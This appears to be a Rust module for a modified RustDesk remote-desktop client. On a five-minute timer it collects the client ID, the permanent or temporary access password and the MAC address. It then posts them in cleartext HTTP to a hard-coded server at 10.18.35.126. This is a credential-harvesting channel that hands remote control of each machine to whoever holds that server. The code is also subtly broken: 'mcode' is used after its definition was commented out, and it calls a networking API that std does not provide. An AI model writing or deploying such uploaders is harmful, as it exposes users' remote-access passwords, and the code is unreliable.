use std::time::{Duration, Instant};
use std::fs::File;
use std::path::Path;
use tokio::time::interval_at;
use reqwest::Client;
use serde::{Deserialize, Serialize};
use serde_json::json;
use anyhow::{Result, bail};
use log::{info, error};
use crate::ipc;
use crate::config::Config;
use hbb_common::get_mac;

// 常量配置
const UPLOAD_URL: &str = "http://10.18.35.126:48080/app-api/rdm/rustdesk-client/upload-client-info";
const UPLOAD_INTERVAL_SECS: u64 = 5 * 60; // 5分钟
const HTTP_TIMEOUT_SECS: u64 = 10;
const CONFIG_FILE_PATH: &str = "./config.json"; // 根目录的config.json

// HTTP请求头常量
const HTTP_HEADER_CONTENT_TYPE: &str = "application/json";
const HTTP_HEADER_TENANT_ID: &str = "1";

// 配置文件结构定义
#[derive(Debug, Deserialize, Serialize)]
struct AppConfig {
    #[serde(rename = "mcode")] // 匹配JSON中的mcode字段
    m_code: Option<String>,
    // 可以添加其他可能的配置字段
}

// 从config.json获取mcode
fn get_mcode_from_config() -> Result<Option<String>> {
    // 检查配置文件是否存在
    if !Path::new(CONFIG_FILE_PATH).exists() {
        error!("Config file not found: {}", CONFIG_FILE_PATH);
        return Ok(None);
    }

    // 读取并解析配置文件
    let file = File::open(CONFIG_FILE_PATH)?;
    let config: AppConfig = serde_json::from_reader(file)?;
    
    Ok(config.m_code)
}

// 从现有代码中获取密码
async fn get_password() -> Result<String> {
    // 优先获取永久密码
    let permanent_pass = if cfg!(any(target_os = "android", target_os = "ios")) {
        Config::get_permanent_password()
    } else {
        ipc::get_permanent_password()
    };

    if !permanent_pass.is_empty() {
        return Ok(permanent_pass);
    }

    // 检查临时密码（如果启用）
    if crate::password::temporary_enabled() {
        let temp_pass = crate::password::temporary_password();
        if !temp_pass.is_empty() {
            return Ok(temp_pass);
        }
    }

    bail!("No valid password found");
}

// 获取Mac地址
fn get_mac_address() -> String {
    if let Ok(ips) = std::net::InterfaceAddrs::new() {
        for ip in ips {
            if let std::net::Addr::V4(v4) = ip.addr() {
                if !v4.is_loopback() {
                    let mac = get_mac(&v4.ip());
                    if !mac.is_empty() {
                        return mac;
                    }
                }
            }
        }
    }
    //  fallback
    get_mac(&std::net::Ipv4Addr::UNSPECIFIED).trim().to_string()
}

// HTTP上传函数（包含mcode字段）
async fn upload_credentials(id: &str, passwd: &str, mac: &str, mcode: &Option<String>) -> Result<()> {
    let client = Client::new();
    let payload = json!({
        "clientId": id,
        "clientPasswd": passwd,
        "macAddress": mac,
        "machineCode": mcode
    });

    let response = client
        .post(UPLOAD_URL)
        .header("Content-Type", HTTP_HEADER_CONTENT_TYPE)
        .header("tenant-id", HTTP_HEADER_TENANT_ID)
        .json(&payload)
        .timeout(Duration::from_secs(HTTP_TIMEOUT_SECS))
        .send()
        .await?;

    if !response.status().is_success() {
        bail!("Upload failed with status: {}", response.status());
    }

    info!("Credentials uploaded successfully (MAC: {}, MCode: {:?})", mac, mcode);
    Ok(())
}

// 启动定时器的函数
pub async fn start_credentials_uploader() {    
    // 定时器配置
    let mut interval = interval_at(
        Instant::now(),
        Duration::from_secs(UPLOAD_INTERVAL_SECS),
    );

    info!("Starting credentials uploader. Interval: {} seconds", UPLOAD_INTERVAL_SECS);
    info!("Upload target URL: {}", UPLOAD_URL);

    loop {
        interval.tick().await;

        // 获取ID
        let id = ipc::get_id();
        info!("Got ID: {}", id);

        // 获取密码
        let passwd = match get_password().await {
            Ok(passwd) => passwd,
            Err(e) => {
                error!("Failed to get password: {}", e);
                continue;
            }
        };

        // 获取Mac地址
        let mac = get_mac_address();
        if mac.is_empty() {
            error!("Failed to get MAC address");
            continue;
        }

        // // 获取mcode
        // let mcode = match get_mcode_from_config() {
        //     Ok(mcode) => mcode,
        //     Err(e) => {
        //         error!("Error reading mcode from config: {}", e);
        //         None // 即使配置读取失败也继续执行上传
        //     }
        // };

        // 上传凭据
        if let Err(e) = upload_credentials(&id, &passwd, &mac, &mcode).await {
            error!("Failed to upload credentials: {}", e);
        }
    }
}
